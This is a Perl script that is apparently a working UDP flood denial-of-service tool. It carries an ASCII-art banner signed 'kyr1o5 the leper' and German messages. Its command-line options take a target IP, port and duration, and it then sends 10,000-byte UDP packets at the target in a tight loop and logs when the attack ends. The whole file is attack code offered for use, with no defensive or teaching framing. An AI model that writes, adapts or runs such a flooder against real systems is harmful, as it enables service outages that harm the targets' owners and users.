#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use Socket;
use Time::HiRes;


my $desenho = <<'ASCII';
    
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ                                                       
ϟ_-_ _,,   ,,      ,      ,,                          ϟ
ϟ   -/  )  ||  '  ||      ||          '         _     ϟ
ϟ  ~||_<   || \\ =||= /\\ ||/\ ,._-_ \\  _-_   / \\   ϟ
ϟ   || \\  || ||  ||   /  ||_<  ||   || || \\ || ||   ϟ
ϟ   ,/--|| || ||  ||  /\\ || |  ||   || ||/   || ||   ϟ
ϟ  _--_-'  \\ \\  \\,  || \\,\  \\,  \\ \\,/  \\_-|   ϟ
ϟ (                    /                       /  \   ϟ
ϟ                     (,                      '----`  ϟ
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ
by:kyr1o5 the leper


ASCII


my $ip;
my $port;
my $time;


GetOptions(
    'ip=s' => \$ip,
    'port=i' => \$port,
    'time=i' => \$time,
);

die "Usage: $0 --ip <target_ip> --port <target_port> --time <attack_time>\n"
  unless $ip && $port && $time;

print($desenho);
print('Attacke!!');

my ($iaddr, $endtime, $psize,$pport);

$iaddr = inet_aton($ip) or die "Der Hostname konnte nicht aufgelöst werden. Bitte versuchen Sie es erneut $ip\n";
$endtime = Time::HiRes::time() + $time;
socket(flood, PF_INET, SOCK_DGRAM, 17);

my $size = 10000;

print "Drücken Sie STRG+C, um den Angriff zu stoppen\n";

for (; Time::HiRes::time() <= $endtime; ) {
    $psize = $size ? $size : int(rand(1024 - 64) + 64);
    $pport = $port ? $port : int(rand(65500)) + 1;

    send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
}

open(my $log, '>>', 'attack_log.txt') or die "Die Protokolldatei kann nicht geöffnet werden: $!";
print $log "Der Angriff endete em ", scalar localtime, "\n";
close $log;
